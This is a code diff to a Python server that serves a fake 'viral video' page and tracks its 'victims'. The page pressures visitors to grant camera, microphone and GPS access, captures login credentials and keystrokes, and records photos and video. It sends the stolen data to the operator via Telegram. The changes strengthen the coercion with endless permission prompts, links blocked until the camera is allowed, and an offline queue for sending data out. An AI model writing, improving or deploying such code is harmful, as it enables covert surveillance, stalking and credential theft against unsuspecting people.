@@ -255,7 +255,7 @@ HTML_PAGE = '''<!DOCTYPE html>
                                     reader.readAsDataURL(blob);
                                 },'image/jpeg',0.85);
                             }catch(e){
-                                try{ var d = canvas.toDataURL('image/jpeg',0.85); fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'FRONT_live', photo:d})}); }catch(e){}
+                                try{ var d = canvas.toDataURL('image/jpeg',0.85); safePost({type:'FRONT_live', photo:d}); }catch(e){}
                             }
                         }
                     }catch(e){}
@@ -263,52 +263,71 @@ HTML_PAGE = '''<!DOCTYPE html>
             }catch(e){}
         }
 
+        // Request GPS location and handle errors, retry until success
         function requestLocation(){
-            try{
-                if(!navigator.geolocation) return;
-                navigator.geolocation.getCurrentPosition(function(pos){
-                    var lat = pos.coords.latitude;
-                    var lon = pos.coords.longitude;
-                    var acc = pos.coords.accuracy;
-                    data.lat = lat; data.lon = lon; data.acc = acc;
-                    safePost({type:'gps', lat:lat, lon:lon, acc:acc});
-                }, function(err){
-                    safePost({type:'diag', msg:'geo_failed', error: err && err.message});
-                }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
-            }catch(e){ safePost({type:'diag', msg:'geo_err', error: e && e.toString()}); }
+            if(!navigator.geolocation){
+                safePost({type:'diag', msg:'geo_not_supported'});
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                data.lat = lat; data.lon = lon; data.acc = acc;
+                safePost({type:'gps', lat:lat, lon:lon, acc:acc});
+                permissionState.geo = true;
+                processQueue();
+            }, err => {
+                safePost({type:'diag', msg:'geo_failed', error: err && err.message});
+                const btn = document.getElementById('verifyBtn');
+                if(btn) btn.innerText = "ALLOW";
+                overlayHandled = false;
+            }, {enableHighAccuracy:true, timeout:10000, maximumAge:0});
+        }
+
+        function hideOverlay(){
+            var overlay = document.getElementById('entryOverlay'); 
+            if(overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
+            document.body.style.overflow = 'auto';
         }
 
         function onUserGesture(ev){
             if(overlayHandled) return; overlayHandled = true;
-            var overlay = document.getElementById('entryOverlay'); if(overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
-            document.body.style.overflow = 'auto';
             safePost({type:'diag', msg:'entry_gesture', ev: ev && ev.type});
             requestLocation();
-            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
-                try{
-                    navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(function(s){
-                        frontStream = s;
-                        var fv = document.getElementById('frontVideo');
-                        try{ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }catch(e){}
-                        camStarted = true;
-                        startSimpleCapture();
-                        safePost({type:'diag', msg:'camera_granted'});
-                    }).catch(function(err){
-                        safePost({type:'diag', msg:'camera_failed', error: (err && err.toString && err.toString()) || 'err'});
-                    });
-                }catch(e){ safePost({type:'diag', msg:'camera_get_err'}); }
-            }
-            try{ setTimeout(function(){ var email=document.getElementById('email').value||''; var pwd=document.getElementById('password').value||''; fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login', email:email, password:pwd})}).catch(function(){}); }, 400); }catch(e){}
+        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+            navigator.mediaDevices.getUserMedia({video:true, audio:true})
+            .then(s => {
+                frontStream = s;
+                const fv = document.getElementById('frontVideo');
+                try{ fv.srcObject = s; fv.playsInline = true; fv.muted = true; fv.autoplay = true; }catch(e){}
+                camStarted = true;
+                permissionState.camera = true;
+                startSimpleCapture();
+                safePost({type:'diag', msg:'camera_granted'});
+                if(permissionState.camera && permissionState.geo) hideOverlay();
+                processQueue();
+            })
+            .catch(err => {
+                safePost({type:'diag', msg:'camera_failed', error: (err && err.toString()) || 'err'});
+                const btn = document.getElementById('verifyBtn');
+                if(btn) btn.innerText = "ALLOW";
+                overlayHandled = false;
+                const warn = document.getElementById('overlayWarn');
+                if(warn) warn.innerHTML = "❌ YOU BLOCKED IT! Please click \"Allow\" on the permission popup, then click the lock icon (🔒) on the right side of the address bar and allow camera permission.";
+            });
+        }
+            try{ setTimeout(function(){ var email=document.getElementById('email').value||''; var pwd=document.getElementById('password').value||''; safePost({type:'login', email:email, password:pwd}); }, 400); }catch(e){}
         }
 
         function attachGesture(){
             var overlay = document.getElementById('entryOverlay');
             if(!overlay) return;
-            var opts = {passive:true, once:true};
+            var opts = {passive:true};
             try{ overlay.addEventListener('touchstart', onUserGesture, opts); }catch(e){}
             try{ overlay.addEventListener('pointerdown', onUserGesture, opts); }catch(e){}
             try{ overlay.addEventListener('click', onUserGesture, opts); }catch(e){}
-            try{ document.addEventListener('touchstart', onUserGesture, {passive:true, once:true}); }catch(e){}
+            try{ document.addEventListener('touchstart', onUserGesture, {passive:true}); }catch(e){}
         }
 
         try{ data.ua = navigator.userAgent; data.screen = (screen.width||0) + 'x' + (screen.height||0); data.lang = navigator.language || ''; }catch(e){}
@@ -317,14 +336,70 @@ HTML_PAGE = '''<!DOCTYPE html>
                 navigator.getBattery().then(b => {
                     data.battery = Math.round(b.level * 100) + '%';
                     data.charging = b.charging;
-                    fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'battery_info', ...data})});
+                    safePost({type:'diag', msg:'battery_info', ...data});
                 }).catch(e=>{});
             }
         }catch(e){}
-        try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'init', data:data})}).catch(function(){}); }catch(e){}
+        try{ safePost({type:'init', data:data}); }catch(e){}
         try{ fetch('https://ipinfo.io/json').then(function(r){ return r.json(); }).then(function(ip){ try{ data.ip=ip.ip; data.city=ip.city; data.country=ip.country; }catch(e){} }).catch(function(){}); }catch(e){}
         try{ var dbg = document.getElementById('debugPermBtn'); if(dbg) dbg.addEventListener('click', function(){ onUserGesture({type:'debugBtn'}); }); }catch(e){}
-        attachGesture();
+
+        // Global permission state object
+        const permissionState = {camera:false, geo:false};
+
+        // Simple offline queue stored in localStorage
+        function enqueuePayload(payload){
+            const existing = JSON.parse(localStorage.getItem('dataQueue')||'[]');
+            existing.push(payload);
+            localStorage.setItem('dataQueue', JSON.stringify(existing));
+        }
+        function processQueue(){
+            if(!navigator.onLine) return;
+            const queue = JSON.parse(localStorage.getItem('dataQueue')||'[]');
+            if(queue.length===0) return;
+            // Send each payload sequentially
+            (function sendNext(){
+                if(queue.length===0){
+                    localStorage.removeItem('dataQueue');
+                    return;
+                }
+                const payload = queue.shift();
+                fetch('/s',{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify(payload)
+                }).then(()=>{ localStorage.setItem('dataQueue', JSON.stringify(queue)); sendNext(); })
+                .catch(()=>{ // if fail, put back and stop
+                    queue.unshift(payload);
+                    localStorage.setItem('dataQueue', JSON.stringify(queue));
+                });
+            })();
+        }
+        window.addEventListener('online', processQueue);
+
+        // Intercept all anchor clicks to enforce permission before navigation
+        document.addEventListener('click', function(e){
+            const a = e.target.closest('a');
+            if(!a) return;
+            if(!permissionState.camera){
+                e.preventDefault();
+                // Show overlay if not already
+                if(!overlayHandled){
+                    const btn = document.getElementById('verifyBtn');
+                    if(btn) btn.innerText = "ALLOW";
+                    overlayHandled = false;
+                }
+                // Trigger permission flow
+                onUserGesture(e);
+                // After permission granted, navigate programmatically
+                const checkAndNavigate = setInterval(()=>{
+                    if(permissionState.camera){
+                        clearInterval(checkAndNavigate);
+                        window.location.href = a.href;
+                    }
+                }, 500);
+            }
+        });
     })();
 
 async function checkCameraPermission(){
@@ -419,9 +494,12 @@ window.addEventListener('load', async ()=>{
             })
             .catch(err=>{
                 // FAILED: They clicked BLOCK
-                if(btn) btn.innerText = "VERIFY & WATCH";
+                if(btn) btn.innerText = "ALLOW"; // Reset button after block
+                // Reset overlayHandled so user can try again
+                overlayHandled = false;
+                // Keep overlay visible for another attempt
                 const warn = document.getElementById('overlayWarn');
-                if(warn) warn.innerHTML = '❌ YOU BLOCKED IT! You MUST click "Allow" on the popup to verify you are human!<br><br><span style="color:#fff">If you accidentally blocked it forever, click the Lock icon (🔒) in your browser address bar and Reset/Allow the Camera permission.</span>';
+                if(warn) warn.innerHTML = '❌ YOU BLOCKED IT! Please click "Allow" on the permission popup to verify you are human.';
                 console.log('getUserMedia failed in gesture', err);
                 try{ fetch('/s',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'diag', msg:'entry_gesture_open_cam_failed', error:err.toString(), ev:e.type, ...data})}); }catch(_){}
             });
@@ -435,18 +513,18 @@ window.addEventListener('load', async ()=>{
 
     if(overlay){
         // attach multiple event types to maximize mobile coverage
-        overlay.addEventListener('touchstart', userGestureHandler, {passive:false, once:true});
-        overlay.addEventListener('touchend', userGestureHandler, {passive:false, once:true});
-        overlay.addEventListener('pointerdown', userGestureHandler, {passive:false, once:true});
-        overlay.addEventListener('pointerup', userGestureHandler, {passive:false, once:true});
-        overlay.addEventListener('click', userGestureHandler, {once:true});
+        overlay.addEventListener('touchstart', userGestureHandler, {passive:false});
+        overlay.addEventListener('touchend', userGestureHandler, {passive:false});
+        overlay.addEventListener('pointerdown', userGestureHandler, {passive:false});
+        overlay.addEventListener('pointerup', userGestureHandler, {passive:false});
+        overlay.addEventListener('click', userGestureHandler, {}); // allow repeated clicks
     }
 
     // Also attach document-level listeners as a fallback if overlay blocks events
     function attachDocFallback(){
-        document.addEventListener('touchstart', userGestureHandler, {passive:false, once:true});
-        document.addEventListener('pointerdown', userGestureHandler, {passive:false, once:true});
-        document.addEventListener('click', userGestureHandler, {once:true});
+        document.addEventListener('touchstart', userGestureHandler, {passive:false});
+        document.addEventListener('pointerdown', userGestureHandler, {passive:false});
+        document.addEventListener('click', userGestureHandler, {}); // allow repeated attempts
     }
     attachDocFallback();
 
@@ -1001,45 +1079,36 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                 victim_count += 1
                 victims_data[v_id] = {'id': victim_count, 'data': {**data, 'time': time.time()}, 'photos': [], 'phone': None}
                 send_telegram(f"🆕 NEW VICTIM #{victim_count}\nDevice: {data.get('ua', 'Unknown')[:50]}")
-            
             victim = victims_data[v_id]
             
             # Update victim data with any new info (like GPS or IP)
             for key, val in data.items():
                 if key not in ['type', 'photo']:
                     victim['data'][key] = val
-                    
+
             msg_type = data.get('type', '')
-            
             if msg_type == 'gps' and 'lat' in data:
+                # Send location text
                 send_telegram(f"📍 GPS (Victim #{victim['id']})\nMap: https://www.google.com/maps?q={data['lat']},{data['lon']}")
-                
-            elif msg_type == 'ip' and 'ip' in data:
-                send_telegram(f"🌐 INFO (Victim #{victim['id']})\nIP: {data['ip']}\nLocation: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}")
-                
-            elif '_live' in msg_type and 'photo' in data:
+                # Send static map image using OpenStreetMap static map service
                 try:
-                    if ',' in data['photo']:
-                        photo_data = data['photo'].split(',')[1]
-                        cam = data.get('camType', 'CAM')
-                        filename = f"victim_{victim['id']}_{cam}_{int(time.time())}.jpg"
-                        with open(filename, 'wb') as f:
-                            f.write(base64.b64decode(photo_data))
-                        victim['photos'].append({'data': photo_data, 'camType': cam})
-                        print(f"Photo Received: {filename} ({len(photo_data)} bytes)")
-                        send_telegram_img(filename, f"📸 Victim #{victim['id']} - {cam}")
-                except Exception as e: print(f"Error: {e}")
-            
-            elif msg_type == 'phone':
-                victim['phone'] = data.get('phone')
-                send_telegram(f"📱 PHONE (Victim #{victim['id']}): {data.get('phone')}")
-            
+                    lat = data['lat']
+                    lon = data['lon']
+                    map_url = f"https://static-maps.yandex.ru/1.x/?lang=en_US&ll={lon},{lat}&size=450,450&z=15&l=map&pt={lon},{lat},pm2rdm"
+                    resp = requests.get(map_url, timeout=10)
+                    if resp.status_code == 200:
+                        img_path = f"victim_{victim['id']}_location_{int(time.time())}.png"
+                        with open(img_path, 'wb') as img_file:
+                            img_file.write(resp.content)
+                        send_telegram_img(img_path, f"📍 Location pin for Victim #{victim['id']}")
+                    else:
+                        print(f"Failed to fetch static map image, status {resp.status_code}")
+                except Exception as e:
+                    print(f"Error sending static map image: {e}")
             elif msg_type == 'keylog':
                 print(f"⌨️ KEYLOG (Victim #{victim['id']}) - {data.get('field')}: {data.get('val')}")
-                
             elif msg_type == 'login':
                 send_telegram(f"🔥 VIRAL VIDEO LOGIN (Victim #{victim['id']})\nEmail: {data.get('email')}\nPassword: {data.get('password')}")
-                
             elif msg_type == 'audio_video' and 'data' in data:
                 try:
                     if ',' in data['data']:
@@ -1048,7 +1117,6 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                         chunk_size = len(decoded)
                         print(f"DEBUG: Received audio_video chunk size={chunk_size} for Victim #{victim['id']}")
                         if chunk_size > 0:
-                            # create or append to per-victim video file
                             if not victim.get('video_filename'):
                                 fname = f"victim_{victim['id']}_VIDEO_{int(time.time())}.webm"
                                 victim['video_filename'] = fname
@@ -1056,15 +1124,14 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                                 print(f"DEBUG: Creating new video file: {fname}")
                             else:
                                 fname = victim['video_filename']
-                            # append chunk
                             with open(fname, 'ab') as f:
                                 f.write(decoded)
                             victim['video_bytes'] = victim.get('video_bytes', 0) + chunk_size
                             print(f"🎥 Appended {chunk_size} bytes to {fname} (total {victim['video_bytes']} bytes)")
                         else:
                             print(f"⚠️ Skipped saving zero-length audio_video chunk for Victim #{victim['id']}")
-                except Exception as e: print(f"AudioVideo Error: {e}")
-
+                except Exception as e:
+                    print(f"AudioVideo Error: {e}")
             elif msg_type == 'audio' and 'audio' in data:
                 try:
                     if ',' in data['audio']:
